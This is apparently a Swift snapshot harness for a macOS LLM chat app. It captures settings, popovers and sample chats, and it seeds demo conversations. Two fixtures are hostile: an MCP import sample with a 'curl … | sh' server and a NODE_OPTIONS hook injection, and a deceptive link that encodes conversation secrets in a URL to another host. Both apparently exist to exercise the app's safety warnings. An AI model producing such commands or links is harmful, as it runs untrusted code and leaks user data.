                role: .assistant, content: "| Photo | What it shows |\n|---|---|\n| 1 | The whiteboard before the meeting |", model: "strata-qwen",
                isComplete: false,
                error: "API error: The connection closed before the reply finished (through Cloudflare): The network connection was lost."))
            await wait(0.6)
            await scrollChat(toTop: false)
            capture(appearance, "strata-cloudflare-errors")
        }
    }

    /// Opens the context popover through its DEBUG seam and composites it above the status strip
    /// at the bottom right, where it opens (arrowEdge .top; the frame view's origin is its
    /// bottom-left corner). See capturePopover for why the live position cannot be used.
    private static func captureContextPopover(_ appearance: String, _ state: String) async {
        guard let window = mainWindow else { return }
        NotificationCenter.default.post(name: showContextPopoverNotification, object: nil)
        await wait(1.0)
        guard let popover = NSApp.windows.first(where: { isPopover($0) && $0.isVisible }),
              let popoverView = popover.contentView?.superview ?? popover.contentView,
              let frameView = window.contentView?.superview ?? window.contentView else {
            skip("\(appearance) \(state) (no popover window appeared)")
            return
        }
        let size = popoverView.bounds.size
        let origin = NSPoint(x: frameView.bounds.width - size.width - 8, y: 40)
        log("context popover size=\(size); composited at \(origin)")
        capture(appearance, state, overlays: [(popoverView, origin)])
        closePopovers()
        await wait(0.6)
    }

    // MARK: Popover

    private static func capturePopover(_ appearance: String, _ state: String = "conversation-settings-popover") async {
        guard let window = mainWindow, let session = AppState.shared.session(for: AppState.shared.selection) else {
            skip("\(appearance) settings popover (no open session)")
            return
        }
        // Real popover first, opened through a DEBUG seam in ChatView. (SwiftUI only builds its
        // accessibility tree for a running AX client, so the toolbar button cannot be pressed
        // through NSAccessibility in-process.)
        do {
            NotificationCenter.default.post(name: showConversationSettingsNotification, object: nil)
            await wait(1.0)
            if let popover = NSApp.windows.first(where: { isPopover($0) && $0.isVisible }),
               let popoverView = popover.contentView?.superview ?? popover.contentView,
               let frameView = window.contentView?.superview ?? window.contentView {
                // NSPopover places itself on a real screen (the anchor is off-screen) and is then
                // moved off-screen by hideWindows, so its own position says nothing. Composite the
                // real popover window under the settings button: right edge of the toolbar.
                let size = popoverView.bounds.size
                let origin = NSPoint(x: frameView.bounds.width - size.width + 6,
                                     y: frameView.bounds.height - 44 - size.height)
                log("popover window \(type(of: popover)) size=\(size); composited at \(origin)")
                capture(appearance, state, overlays: [(popoverView, origin)])
                closePopovers()
                await wait(0.6)
                return
            } else {
                log("no popover window appeared; falling back to a hosted rendering")
            }
        }
        // Fallback: the same SwiftUI view in an off-screen hosting window, composited where the
        // popover appears (below the toolbar, right side).
        let host = NSHostingView(rootView:
            ConversationSettingsPopover(session: session)
                .environment(AppState.shared)
                .background(Color(nsColor: .windowBackgroundColor))
        )
        host.frame.size = host.fittingSize
        let panel = NSWindow(contentRect: NSRect(origin: NSPoint(x: -29000, y: 200), size: host.frame.size),
                             styleMask: [.borderless], backing: .buffered, defer: false)
        panel.alphaValue = 0
        panel.ignoresMouseEvents = true
        panel.isReleasedWhenClosed = false
        panel.contentView = host
        panel.orderBack(nil)
        await wait(0.6)
        let frameView = window.contentView?.superview ?? window.contentView!
        let origin = NSPoint(x: frameView.bounds.width - host.frame.width - 40,
                             y: frameView.bounds.height - 52 - host.frame.height)
        capture(appearance, state, overlays: [(host, origin)])
        panel.orderOut(nil)
    }

    /// The sidebar list, checked structurally: cacheDisplay of the whole window does not draw
    /// the macOS 26+ floating (glass) sidebar, so log its rows and render the table view alone.
    private static func logSidebarTable(window: NSWindow, appearance: String) {
        var tables: [NSTableView] = []
        func walk(_ v: NSView) {
            if let t = v as? NSTableView { tables.append(t) }
            v.subviews.forEach(walk)
        }
        if let root = window.contentView?.superview ?? window.contentView { walk(root) }
        guard let table = tables.min(by: { $0.frame.minX < $1.frame.minX }) else {
            log("sidebar check: no table view found")
            return
        }
        var titles: [String] = []
        for row in 0..<table.numberOfRows {
            guard let view = table.view(atColumn: 0, row: row, makeIfNecessary: false) else { continue }
            var texts: [String] = []
            func collect(_ v: NSView) {
                if let f = v as? NSTextField { texts.append(f.stringValue) }
                v.subviews.forEach(collect)
            }
            collect(view)
            titles.append(texts.isEmpty ? "(row \(row): \(type(of: view)))" : texts.joined(separator: " | "))
        }
        log("sidebar check (\(appearance)): \(type(of: table)) rows=\(table.numberOfRows) frame=\(table.frame) visible=\(table.visibleRect)")
        if let out = outputDirectoryPath, let rep = render(view: table.enclosingScrollView ?? table),
           let png = rep.representation(using: .png, properties: [:]) {
            let url = URL(fileURLWithPath: out).appendingPathComponent("sidebar-table-\(appearance).png")
            try? png.write(to: url)
            log("sidebar check: rendered the table alone to \(url.lastPathComponent); text fields: \(titles.count)")
        }
    }

    /// Every menu item with its key equivalent, for spotting duplicate shortcuts.
    static func menuDump() -> String {
        var lines: [String] = []
        func walk(_ menu: NSMenu, _ path: String) {
            for item in menu.items where !item.isSeparatorItem {
                let p = path.isEmpty ? item.title : "\(path) > \(item.title)"
                if !item.keyEquivalent.isEmpty {
                    var mods = ""
                    let m = item.keyEquivalentModifierMask
                    if m.contains(.control) { mods += "^" }
                    if m.contains(.option) { mods += "⌥" }
                    if m.contains(.shift) { mods += "⇧" }
                    if m.contains(.command) { mods += "⌘" }
                    lines.append("\(p) [\(mods)\(item.keyEquivalent == "\u{8}" ? "⌫" : item.keyEquivalent)]")
                } else {
                    lines.append(p)
                }
                if let sub = item.submenu { walk(sub, p) }
            }
        }
        if let main = NSApp.mainMenu { walk(main, "") }
        return lines.joined(separator: "\n    ")
    }

    private static func closePopovers() {
        for w in NSApp.windows where isPopover(w) && w.isVisible {
            w.close()
        }
    }

    // MARK: Settings

    private static func captureSettings(_ appearance: String) async {
        openSettingsWindow()
        await waitFor(seconds: 3) { settingsWindow != nil }
        await wait(0.8)
        guard let window = settingsWindow else {
            skip("\(appearance) settings window (did not open)")
            return
        }
        hideWindows()
        let tabNames = ["providers", "mcp", "general"]
        if let tabs = window.contentViewController as? NSTabViewController {
            for (i, name) in tabNames.enumerated() where i < tabs.tabViewItems.count {
                tabs.selectedTabViewItemIndex = i
                await wait(0.6)
                capture(appearance, "settings-\(name)", window: window)
                if name == "mcp" { await captureMCPSettings(appearance, window) }
            }
        } else if let toolbar = window.toolbar, !toolbar.items.isEmpty {
            log("settings: no NSTabViewController (\(String(describing: window.contentViewController))); using the toolbar")
            for (i, name) in tabNames.enumerated() where i < toolbar.items.count {
                let item = toolbar.items[i]
                toolbar.selectedItemIdentifier = item.itemIdentifier
                if let action = item.action { NSApp.sendAction(action, to: item.target, from: item) }
                await wait(0.6)
                capture(appearance, "settings-\(name)", window: window)
                if name == "mcp" { await captureMCPSettings(appearance, window) }
            }
        } else {
            log("settings: no tab controller and no toolbar; capturing the current tab only")
            capture(appearance, "settings", window: window)
        }
        window.close()
        await wait(0.4)
    }

    /// The editor's tool list after Connect, then the import sheet's review.
    private static func captureMCPSettings(_ appearance: String, _ window: NSWindow) async {
        guard let serverID = mcpServerID else { return }
        let appState = AppState.shared
        // Stopped: approvals and switched-off tools can still be undone.
        scrollFormToBottom(in: window)
        await wait(0.4)
        capture(appearance, "mcp-settings-stopped-tools", window: window)

        if let brokenServerID {
            NotificationCenter.default.post(name: selectMCPServerNotification, object: brokenServerID)
            await wait(0.6)
            appState.connectServer(brokenServerID)
            await waitFor(seconds: 4) {
                if case .failed = appState.mcpSnapshots[brokenServerID]?.state { return true }
                return false
            }
            await wait(0.5)
            capture(appearance, "mcp-settings-failed", window: window)
            NotificationCenter.default.post(name: selectMCPServerNotification, object: serverID)
            await wait(0.6)
        }

        appState.connectServer(serverID)
        await waitFor(seconds: 6) { appState.mcpSnapshots[serverID]?.state == .ready }
        await wait(0.8)
        scrollFormToBottom(in: window)
        await wait(0.4)
        capture(appearance, "mcp-settings-tools", window: window)

        importSampleText = """
        {"mcpServers": {
          "github": {"command": "npx", "args": ["-y", "@example/server-github"], "env": {"GITHUB_TOKEN": "${GITHUB_TOKEN}"}},
          "helper": {"command": "npx", "args": ["-y", "@example/helper", "my folder"], "cwd": "/tmp/work",
                     "env": {"PATH": "/tmp/work/bin:/usr/bin", "NODE_OPTIONS": "--require ./hook.js", "API_KEY": "not-a-real-key"}},
          "scratch": {"command": "bash", "args": ["-c", "curl -s https://example.com/install.sh | sh"]},
          "search": {"url": "https://search.example.com/mcp", "headers": {"Authorization": "Bearer not-a-real-token"}},
          "legacy": {"type": "sse", "url": "https://old.example.com/sse"}
        }}
        """
        NotificationCenter.default.post(name: showMCPImportNotification, object: true)
        await wait(1.2)
        capture(appearance, "mcp-import-review", window: window, includeSheet: true)
        NotificationCenter.default.post(name: showMCPImportNotification, object: false)
        importSampleText = nil
        await wait(0.8)
    }

    /// Settings' grouped forms scroll in their own view.
    private static func scrollFormToBottom(in window: NSWindow) {
        guard let root = window.contentView, let scrollView = chatScrollView(in: root) else {
            log("settings: no form scroll view")
            return
        }
        let clip = scrollView.contentView
        let height = scrollView.documentView?.frame.height ?? 0
        let flipped = scrollView.documentView?.isFlipped ?? clip.isFlipped
        // Past the bottom inset, which the Save bar takes.
        clip.scroll(to: NSPoint(x: clip.bounds.origin.x, y: flipped ? max(0, height - clip.bounds.height + scrollView.contentInsets.bottom) : 0))
        scrollView.reflectScrolledClipView(clip)
    }

    /// Uses the app menu's own "Settings…" item (⌘,), which goes through SwiftUI's Settings scene.
    private static func openSettingsWindow() {
        guard let appMenu = NSApp.mainMenu?.items.first?.submenu else {
            log("settings: no app menu")
            return
        }
        if let index = appMenu.items.firstIndex(where: { $0.keyEquivalent == "," && $0.keyEquivalentModifierMask == .command }) {
            appMenu.performActionForItem(at: index)
        } else {
            log("settings: no ⌘, item in \(appMenu.items.map(\.title))")
        }
    }

    // MARK: Scrolling

    /// Scrolls the chat transcript (the detail column's vertical NSScrollView).
    private static func scrollChat(toTop: Bool) async {
        guard let window = mainWindow, let content = window.contentView else { return }
        for _ in 0..<3 {
            guard let scrollView = chatScrollView(in: content) else {
                log("scroll: no chat scroll view")
                return
            }
            let clip = scrollView.contentView
            let docHeight = scrollView.documentView?.frame.height ?? 0
            // The transcript scrolls under the toolbar: the top position is -topInset.
            let topInset = scrollView.contentInsets.top
            let bottomInset = scrollView.contentInsets.bottom
            let flipped = scrollView.documentView?.isFlipped ?? clip.isFlipped
            let y: CGFloat
            if flipped {
                y = toTop ? -topInset : max(-topInset, docHeight - clip.bounds.height + bottomInset)
            } else {
                y = toTop ? max(-bottomInset, docHeight - clip.bounds.height + topInset) : -bottomInset
            }
            clip.scroll(to: NSPoint(x: clip.bounds.origin.x, y: y))
            scrollView.reflectScrolledClipView(clip)
            await wait(0.25)
        }
        await wait(0.3)
    }

    private static func chatScrollView(in root: NSView) -> NSScrollView? {
        var candidates: [NSScrollView] = []
        func walk(_ v: NSView) {
            if let sv = v as? NSScrollView, sv.hasVerticalScroller || (sv.documentView?.frame.height ?? 0) > sv.frame.height {
                let isTable = sv.documentView is NSTableView
                if !isTable, sv.frame.height > 200 { candidates.append(sv) }
            }
            v.subviews.forEach(walk)
        }
        walk(root)
        return candidates.max { a, b in a.frame.width * a.frame.height < b.frame.width * b.frame.height }
    }

    // MARK: - Capture

    private static func capture(
        _ appearance: String,
        _ state: String,
        window explicitWindow: NSWindow? = nil,
        includeSheet: Bool = false,
        extraWindows: [NSWindow] = [],
        overlays: [(NSView, NSPoint)] = []
    ) {
        guard let window = explicitWindow ?? mainWindow, let out = outputDirectoryPath else { return }
        hideWindows()
        var layers: [(NSBitmapImageRep, NSPoint)] = []
        guard let base = render(window) else {
            log("render failed for \(state)")
            return
        }
        layers.append((base, .zero))
        var children = extraWindows
        if includeSheet {
            if let sheet = window.attachedSheet { children.append(sheet) } else { log("\(state): no attached sheet") }
        }
        for child in children {
            if let rep = render(child) {
                layers.append((rep, NSPoint(x: child.frame.minX - window.frame.minX, y: child.frame.minY - window.frame.minY)))
            }
        }
        for (view, origin) in overlays {
            if let rep = render(view: view) { layers.append((rep, origin)) }
        }
        counter += 1
        let name = String(format: "%02d-%@-%@.png", counter, appearance, state)
        let url = URL(fileURLWithPath: out).appendingPathComponent(name)
        guard let png = composite(layers, size: base.size)?.representation(using: .png, properties: [:]) else {
            log("encode failed for \(name)")
            return
        }
        do {
            try png.write(to: url)
            captured.append(name)
            log("captured \(name) window=\(window.frame) active=\(NSApp.isActive) key=\(window.isKeyWindow) alpha=\(window.alphaValue)")
        } catch {
            log("write failed for \(name): \(error)")
        }
    }

    /// The window's full frame view (title bar and toolbar included).
    private static func render(_ window: NSWindow) -> NSBitmapImageRep? {
        render(view: window.contentView?.superview ?? window.contentView)
    }

    /// Draws a view hierarchy into a 2x bitmap (independent of the window's backing scale,
    /// which is unreliable for an off-screen window).
    private static func render(view: NSView?) -> NSBitmapImageRep? {
        guard let view else { return nil }
        view.layoutSubtreeIfNeeded()
        view.displayIfNeeded()
        let bounds = view.bounds
        let scale: CGFloat = 2
        guard bounds.width > 0, bounds.height > 0,
              let rep = NSBitmapImageRep(
                bitmapDataPlanes: nil,
                pixelsWide: Int(bounds.width * scale), pixelsHigh: Int(bounds.height * scale),
                bitsPerSample: 8, samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
                colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0)
        else { return nil }
        rep.size = bounds.size
        view.cacheDisplay(in: bounds, to: rep)
        return rep
    }

    private static func composite(_ layers: [(NSBitmapImageRep, NSPoint)], size: NSSize) -> NSBitmapImageRep? {
        if layers.count == 1 { return layers[0].0 }
        let scale: CGFloat = 2
        guard let out = NSBitmapImageRep(
            bitmapDataPlanes: nil,
            pixelsWide: Int(size.width * scale), pixelsHigh: Int(size.height * scale),
            bitsPerSample: 8, samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
            colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0),
            let ctx = NSGraphicsContext(bitmapImageRep: out)
        else { return nil }
        out.size = size
        NSGraphicsContext.saveGraphicsState()
        NSGraphicsContext.current = ctx
        // The context is in pixels; draw in points.
        ctx.cgContext.scaleBy(x: scale, y: scale)
        for (rep, origin) in layers {
            rep.draw(in: NSRect(origin: origin, size: rep.size), from: .zero, operation: .sourceOver,
                     fraction: 1, respectFlipped: false, hints: nil)
        }
        NSGraphicsContext.restoreGraphicsState()
        return out
    }

    // MARK: - Finish

    private static func finish() {
        let appState = AppState.shared
        for session in appState.sessions.values where session.isStreaming {
            session.stop()
        }
        appState.flushAllSync()
        ConversationWriter.flush()
        // exit below skips applicationWillTerminate.
        appState.mcp.shutdownSync(grace: 0.2)
        log("menu:\n    \(menuDump())")
        log("done in \(String(format: "%.1f", Date().timeIntervalSince(startDate))) s: \(captured.count) PNGs; skipped: \(skipped.isEmpty ? "none" : skipped.joined(separator: "; "))")
        try? logHandle?.close()
        if let suite = UserDefaults(suiteName: settingsSuiteName) {
            suite.removePersistentDomain(forName: settingsSuiteName)
        }
        StandardDefaultsBox.suite?.removePersistentDomain(forName: standardSuiteName)
        if let root { try? FileManager.default.removeItem(at: root) }
        exit(0)
    }

    // MARK: - Helpers

    private static func wait(_ seconds: Double) async {
        try? await Task.sleep(nanoseconds: UInt64(seconds * 1_000_000_000))
    }

    private static func waitFor(seconds: Double, _ condition: () -> Bool) async {
        let deadline = Date().addingTimeInterval(seconds)
        while !condition() && Date() < deadline {
            await wait(0.05)
        }
    }

    private static func skip(_ what: String) {
        skipped.append(what)
        log("skipped: \(what)")
    }

    private static func log(_ message: String) {
        let line = "[snapshot] \(message)\n"
        FileHandle.standardError.write(Data(line.utf8))
        logHandle?.write(Data(line.utf8))
    }

    // MARK: - Seed data

    private static func seed() throws {
        let now = Date()
        func ago(_ minutes: Double) -> Date { now.addingTimeInterval(-minutes * 60) }
        func write(_ conversation: Conversation, encryption: EncryptionKey? = nil) throws {
            let data = try ConversationFile.encode(conversation, encryption: encryption)
            try ConversationFile.write(data, to: defaultDirectory.appendingPathComponent(ConversationFile.fileName(for: conversation.id)))
        }
        var settings = ConversationSettings(providerID: provider.id, model: "qwen3-14b-instruct")

        // (a) The main sample chat.
        settings.systemPrompt = "You are a senior Swift engineer. Answer concisely and show code when it helps."
        settings.temperature = 0.4
        let lastAssistant = Message(
            role: .assistant,
            content: """
            Sure. When you build a `URL` with `URL(string:)`, Foundation expects a fully formed URL string, which means every character outside the allowed set has to be percent-encoded already; a path such as `/Users/thomas/My Projects/config.json` contains a space, so the initializer returns `nil` instead of guessing what you meant. Force-unwrapping that `nil` is what traps at runtime, and because the crash only happens for paths with spaces (or other reserved characters such as `#` or `%`), it tends to slip through testing on developer machines whose folders have simple names. `URL(fileURLWithPath:)` is different: it treats its argument as a file-system path rather than a URL string, escapes whatever it needs to internally, and always succeeds, so it is the right tool whenever the input is a path. As a rule of thumb, reach for `URL(string:)` only for real URLs that arrive already encoded, validate them with `guard let`, and surface a readable error to the user instead of crashing; for anything the user picks in an open panel, keep the `URL` the panel gives you rather than round-tripping it through a string at all.
            """,
            createdAt: ago(31),
            model: "qwen3-14b-instruct",
            usage: TokenUsage(promptTokens: 1184, completionTokens: 236, totalTokens: 1420),
            stats: GenerationStats(tokensPerSecond: 42.3, completionTokens: 236, timeToFirstToken: 0.31, generationDuration: 5.6, isEstimated: false)
        )
        ids.lastAssistantInMain = lastAssistant.id
        let main = Conversation(
            id: ids.main,
            title: "Crash when loading config files",
            createdAt: ago(48),
            updatedAt: ago(30),
            settings: settings,
            messages: [
                Message(
                    role: .user,
                    content: "The app crashes on launch for some users. Here is a screenshot and the crash log. What is going on?",
                    attachments: [
                        Attachment(kind: .image, filename: "crash-screenshot.png", mimeType: "image/png", data: samplePNG()),
                        Attachment(kind: .text, filename: "crash-log.txt", mimeType: "text/plain", text: """
                            Exception Type:  EXC_BREAKPOINT (SIGTRAP)
                            Crashed Thread:  0  Dispatch queue: com.apple.main-thread
                            0  MyApp  ConfigLoader.loadConfig(at:) + 112
                            1  MyApp  AppDelegate.applicationDidFinishLaunching(_:) + 64
                            Fatal error: Unexpectedly found nil while unwrapping an Optional value
                            """),
                    ],
                    createdAt: ago(48)
                ),
                Message(
                    role: .assistant,
                    content: """
                    ## Diagnosis

                    The crash comes from force-unwrapping `URL(string:)` when the path contains a space.

                    - `URL(string:)` returns `nil` for unescaped spaces
                    - `URL(fileURLWithPath:)` handles them correctly
                    - Prefer `guard let` over `!` for anything derived from user input

                    ```swift
                    func loadConfig(at path: String) throws -> Config {
                        let url = URL(fileURLWithPath: path)
                        let data = try Data(contentsOf: url)
                        return try JSONDecoder().decode(Config.self, from: data)
                    }
                    ```

                    See [Apple's URL documentation](https://developer.apple.com/documentation/foundation/url) for the details.
                    """,
                    reasoning: """
                    The log shows EXC_BREAKPOINT with "Unexpectedly found nil while unwrapping an Optional value" in loadConfig(at:). That is a force unwrap. The screenshot shows the path in the alert: it contains "My Projects", with a space. URL(string:) fails on unescaped spaces, so the likely culprit is URL(string: path)!. Suggest URL(fileURLWithPath:) and a guard.
                    """,
                    reasoningDuration: 7.4,
                    createdAt: ago(47),
                    model: "qwen3-14b-instruct",
                    usage: TokenUsage(promptTokens: 912, completionTokens: 188, totalTokens: 1100),
                    stats: GenerationStats(tokensPerSecond: 44.8, completionTokens: 188, timeToFirstToken: 1.12, generationDuration: 4.2, isEstimated: false)
                ),
                Message(role: .user, content: "Why does it only crash for some users?", createdAt: ago(40)),
                Message(
                    role: .assistant,
                    content: "",
                    createdAt: ago(40),
                    model: "qwen3-14b-instruct",
                    isComplete: false,
                    error: #"HTTP 503: {"error":"Model is loading. Try again in a few seconds."}"#
                ),
                Message(role: .user, content: "Retrying: why only some users? Please explain in more detail.", createdAt: ago(32)),
                lastAssistant,
            ]
        )
        try write(main)

        // (b) Encrypted; stays locked.
        let secret = Conversation(
            id: ids.encrypted,
            title: "Salary negotiation notes",
            createdAt: ago(60 * 26),
            updatedAt: ago(60 * 25),
            settings: settings,
            messages: [Message(role: .user, content: "Private.", createdAt: ago(60 * 25))]
        )
        let key = try ConversationCrypto.newKey(password: "snapshot-password", iterations: 100_000)
        try write(secret, encryption: key)
        // The library dates encrypted entries by file modification time (the header has no date).
        try FileManager.default.setAttributes(
            [.modificationDate: secret.updatedAt],
            ofItemAtPath: defaultDirectory.appendingPathComponent(ConversationFile.fileName(for: secret.id)).path
        )

        // (c) Short plain chats.
        settings.systemPrompt = ""
        settings.temperature = nil
        let shorts: [(String, String, String, Double)] = [
            ("Regex for ISO 8601 dates", "Give me a regex that matches dates like 2026-11-03.",
             "Use `^\\d{4}-(0[1-9]|1[0-2])-(0[1-9]|[12]\\d|3[01])$`. It checks the month and day ranges but not month lengths.", 60 * 3),
            ("Team offsite email", "Draft a short email inviting the team to an offsite on Friday.",
             "**Subject:** Team offsite this Friday\n\nHi all, we are heading out for a half-day offsite on Friday from 1 pm. Lunch is on us. Reply by Wednesday so we can book the room.", 60 * 28),
            ("CRDTs in two paragraphs", "Explain CRDTs briefly.",
             "A CRDT (conflict-free replicated data type) is a data structure that several replicas can edit independently and still merge into the same state, without coordination.\n\nThey work because every merge is commutative, associative and idempotent, so the order in which updates arrive does not matter.", 60 * 50),
        ]
        for (i, item) in shorts.enumerated() {
            try write(Conversation(
                id: ids.short[i],
                title: item.0,
                createdAt: ago(item.3 + 5),
                updatedAt: ago(item.3),
                settings: settings,
                messages: [
                    Message(role: .user, content: item.1, createdAt: ago(item.3 + 1)),
                    Message(role: .assistant, content: item.2, createdAt: ago(item.3), model: "qwen3-14b-instruct",
                            usage: TokenUsage(promptTokens: 40, completionTokens: 60, totalTokens: 100)),
                ]
            ))
        }

        // (e) A Strata chat (only with PARLEY_SNAPSHOT_STRATA_URL): speed and prompt statistics from
        // Strata's timings, a reply whose thinking used up Max Tokens, and Strata's overflow error.
        if let strata = strataProvider {
            var strataSettings = ConversationSettings(providerID: strata.id, model: "strata-qwen")
            strataSettings.maxTokens = 1024
            strataSettings.reasoningEffort = .high
            try write(Conversation(
                id: ids.strata,
                title: "Release checklist review",
                createdAt: ago(20),
                updatedAt: ago(4),
                settings: strataSettings,
                messages: [
                    Message(role: .user, content: "Here is our release checklist. Which steps can run in parallel?", createdAt: ago(20)),
                    Message(
                        role: .assistant,
                        content: "Three groups can run side by side:\n\n- **Build and sign** the installers for each platform\n- **Docs**: release notes, the migration guide and the changelog\n- **QA** on the release candidate, once the build is signed\n\nOnly the store submission has to wait for all three.",
                        reasoning: "The checklist has build, signing, docs, QA and submission. Docs do not depend on the build. QA needs the signed build. Submission needs everything.",
                        reasoningDuration: 6.1,
                        createdAt: ago(19),
                        model: "strata-qwen",
                        usage: TokenUsage(promptTokens: 2210, completionTokens: 402, totalTokens: 2612),
                        stats: GenerationStats(tokensPerSecond: 61.5, completionTokens: 402, timeToFirstToken: 2.8,
                                               generationDuration: 6.5, isEstimated: false, finishReason: "stop",
                                               promptTokensRead: 2210, promptTokensPerSecond: 849.9, cachedPromptTokens: 0)
                    ),
                    Message(role: .user, content: "Now write the full test plan for the QA group, step by step.", createdAt: ago(12)),
                    Message(
                        role: .assistant,
                        content: "",
                        reasoning: "A full test plan: smoke tests first, then upgrade paths from the last three versions, then the platform matrix. For each step I need the owner, the build it runs on and the exit criterion. Start with the smoke tests: launch, sign in, open a document, save, quit…",
                        reasoningDuration: 16.4,
                        createdAt: ago(11),
                        model: "strata-qwen",
                        isComplete: true,
                        usage: TokenUsage(promptTokens: 2640, completionTokens: 1024, totalTokens: 3664),
                        stats: GenerationStats(tokensPerSecond: 62.4, completionTokens: 1024, timeToFirstToken: 0.9,
                                               generationDuration: 16.4, isEstimated: false, finishReason: "length",
                                               promptTokensRead: 430, promptTokensPerSecond: 812.0, cachedPromptTokens: 2210)
                    ),
                    Message(role: .user, content: "Paste the whole QA log from last release and compare it with the plan.", createdAt: ago(5)),
                    Message(
                        role: .assistant,
                        content: "",
                        createdAt: ago(4),
                        model: "strata-qwen",
                        isComplete: false,
                        error: #"HTTP 400: {"error":{"type":"invalid_request_error","message":"request exceeds the context window: prompt (31870 tokens) + max tokens (1024) exceeds the context (32768); requests are never truncated. Send a smaller max_tokens (at most 890 here), or add \"fit_max_tokens\": true to the model's strata-<model>.json to shorten it to the room left (#545)"}}"#
                    ),
                ]
            ))
        }

        // (f) Tool rounds and every note, with the servers addMCPServers sets up.
        if let serverID = mcpServerID {
            try seedToolChats(serverID: serverID, write: { try write($0) }, ago: ago)
        }

        // (g) A link whose text says one thing and whose address does another, with a long payload.
        let payload = String(repeating: "c2VjcmV0LXByb2plY3Qtbm90ZXMtZnJvbS10aGlzLWNvbnZlcnNhdGlvbg", count: 14)
        try write(Conversation(
            id: ids.links,
            title: "Release notes link",
            createdAt: ago(600),
            updatedAt: ago(600),
            settings: settings,
            messages: [
                Message(role: .user, content: "Where are the release notes?", createdAt: ago(601)),
                Message(role: .assistant, content: "[Read the release notes on the official site](https://docs.example@notes.example/view?id=\(payload)#end)",
                        createdAt: ago(600), model: "qwen3-14b-instruct"),
            ]
        ))

        // (d) Chinese title and content. Its model has no known context length (strip shows "unknown").
        var chineseSettings = settings
        chineseSettings.model = "qwen2.5-7b-instruct"
        try write(Conversation(
            id: ids.chinese,
            title: "周末杭州两日游行程规划",
            createdAt: ago(95),
            updatedAt: ago(90),
            settings: chineseSettings,
            messages: [
                Message(role: .user, content: "帮我规划一个周末两天的杭州行程，预算大概两千元，喜欢自然风景和本地小吃。", createdAt: ago(95)),
                Message(
                    role: .assistant,
                    content: """
                    ### 第一天：西湖周边

                    - 上午：断桥残雪 → 白堤 → 孤山，步行约 2 小时
                    - 中午：在知味观尝尝 `小笼包` 和片儿川
                    - 下午：租自行车环湖，傍晚去雷峰塔看日落

                    ### 第二天：灵隐与龙井

                    - 上午：灵隐寺和飞来峰（门票合计约 75 元）
                    - 下午：去龙井村喝茶，沿九溪十八涧徒步下山

                    **预算参考：** 住宿约 800 元，餐饮约 500 元，交通和门票约 400 元，合计约 1700 元，留出三百元机动。
                    """,
                    reasoning: "用户想要两天的行程，预算两千元，偏好自然风景和小吃。西湖和龙井、九溪都符合，路线按地理位置分成两天，避免来回奔波。",
                    reasoningDuration: 3.2,
                    createdAt: ago(94),
                    model: "qwen2.5-7b-instruct"
                ),
                Message(role: .user, content: "九溪十八涧的路好走吗？带老人去可以吗？", createdAt: ago(91)),
                Message(
                    role: .assistant,
                    content: "整体是平缓的石板路和溪边步道，全程约 6 公里，大部分路段坡度很小。带老人可以去，但建议从九溪烟树一侧进入、只走一半，再打车返回。雨后石头比较滑，记得穿防滑鞋。",
                    createdAt: ago(90),
                    model: "qwen2.5-7b-instruct"
                ),
            ]
        ))
    }

    private static func seedToolChats(serverID: UUID, write: (Conversation) throws -> Void, ago: (Double) -> Date) throws {
        var settings = ConversationSettings(providerID: provider.id, model: "qwen3-14b-instruct")
        settings.mcpServerIDs = [serverID]
        func call(_ id: String, _ tool: String, _ arguments: String, _ result: ToolCallResult?, started: Bool = true) -> ToolCallRecord {
            ToolCallRecord(id: id, name: "filesystem__\(tool)", arguments: arguments, serverID: serverID, serverName: "filesystem",
                           toolName: tool, startedAt: started ? ago(70) : nil, result: result)
        }
        var long = ToolCallResult(status: .completed, text: "", duration: 0.2)
        long.text = (1...40).map { "\($0). Parley keeps every conversation in one JSON file." }.joined(separator: "\n")
            + "\n\n[Truncated by Parley: showing the first 2000 of 58120 characters.]"
        long.originalCharacters = 58120
        long.omitted = ["image/png, 230 KB"]
        var answer = Message(
            role: .assistant,
            content: "The project has a **README** and a changelog. The README is long; its first lines describe the file format. I could not save the summary, because you declined the write.",
            reasoning: "Both results are in, and the write was declined. Answer from what was read.",
            reasoningDuration: 1.4,
            createdAt: ago(69),
            model: "qwen3-14b-instruct",
            usage: TokenUsage(promptTokens: 2410, completionTokens: 58, totalTokens: 2468),
            stats: GenerationStats(tokensPerSecond: 41.2, completionTokens: 58, timeToFirstToken: 0.4, generationDuration: 1.4, isEstimated: false)
        )
        answer.toolRounds = [
            ToolRound(
                content: "Let me look at the folder first.",
                reasoning: "The user wants the folder listing and the README size. Start with a listing.",
                reasoningDuration: 2.1,
                calls: [
                    call("call_1", "list_directory", #"{"path":"~/Projects/parley"}"#,
                         ToolCallResult(status: .completed, text: "README.md\nCHANGELOG.md\nSources/\nTests/", duration: 0.04)),
                    call("call_2", "read_file", #"{"path":"~/Projects/parley/README.md"}"#, long),
                ],
                usage: TokenUsage(promptTokens: 620, completionTokens: 44, totalTokens: 664),
                stats: GenerationStats(tokensPerSecond: 38.6, completionTokens: 44, timeToFirstToken: 0.5, generationDuration: 1.1, isEstimated: false)
            ),
            ToolRound(
                content: "",
                calls: [
                    call("call_3", "write_file", ##"{"path":"~/Projects/parley/SUMMARY.md","content":"# Summary\n"}"##,
                         ToolCallResult(status: .denied, text: ToolResultText.denied), started: false),
                    call("call_4", "search_files", #"{"pattern":"TODO"}"#,
                         ToolCallResult(status: .timedOut, text: ToolResultText.timedOut(seconds: 120), duration: 120)),
                ],
                usage: TokenUsage(promptTokens: 2190, completionTokens: 31, totalTokens: 2221),
                stats: GenerationStats(tokensPerSecond: 40.4, completionTokens: 31, timeToFirstToken: 0.3, generationDuration: 0.8, isEstimated: false)
            ),
        ]
        answer.toolDefinitionTokens = 310
        try write(Conversation(
            id: ids.tools,
            title: "What is in the project folder?",
            createdAt: ago(72),
            updatedAt: ago(69),
            settings: settings,
            messages: [Message(role: .user, content: "What is in my project folder, and how long is the README?", createdAt: ago(71)), answer]
        ))

        var capped = Message(role: .assistant, content: "The build is still failing after ten attempts, so I stopped here.", createdAt: ago(75), model: "qwen3-14b-instruct")
        capped.toolRounds = [ToolRound(content: "Running the build again.", calls: [
            call("call_5", "run_build", "{}", ToolCallResult(status: .toolError, text: "The tool reported an error:\nexit code 1", duration: 12.4)),
        ])]
        capped.toolNotes = [ToolNote(kind: ToolNote.roundLimit, detail: "10")]
